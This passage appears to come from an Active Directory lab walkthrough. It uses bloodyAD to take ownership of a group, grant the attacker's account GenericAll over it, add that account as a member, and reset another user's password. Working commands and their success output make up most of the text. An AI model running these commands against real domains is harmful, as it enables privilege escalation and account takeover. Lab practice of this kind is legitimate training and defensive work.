i made automatic for us

This command will **OWN** groups

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eray -p banana set owner TESTGROUP eray
```

and if we owned now we can give ourself FullPrivileges

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eray -p banana add genericAll TESTGROUP eray
```

and this will add ourself on group

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eray -p banana add groupMember "TESTGROUP" eray            
```

Now **eray** has Full Permissions on **TestGroup** we can verify with find_aces

![alt text](../assets/images/dacl78.png)

now we can use **TestGroup** permission with **eray**

![alt text](../assets/images/dacl79.png)

now we can change password off ferhat!!!

```bash
bloodyAD --host VALENOR-DC01.lab.local -d lab.local -u eray -p banana set password ferhat NewPassword123
[+] Password changed successfully! 
```

![alt text](../assets/images/dacl80.png)
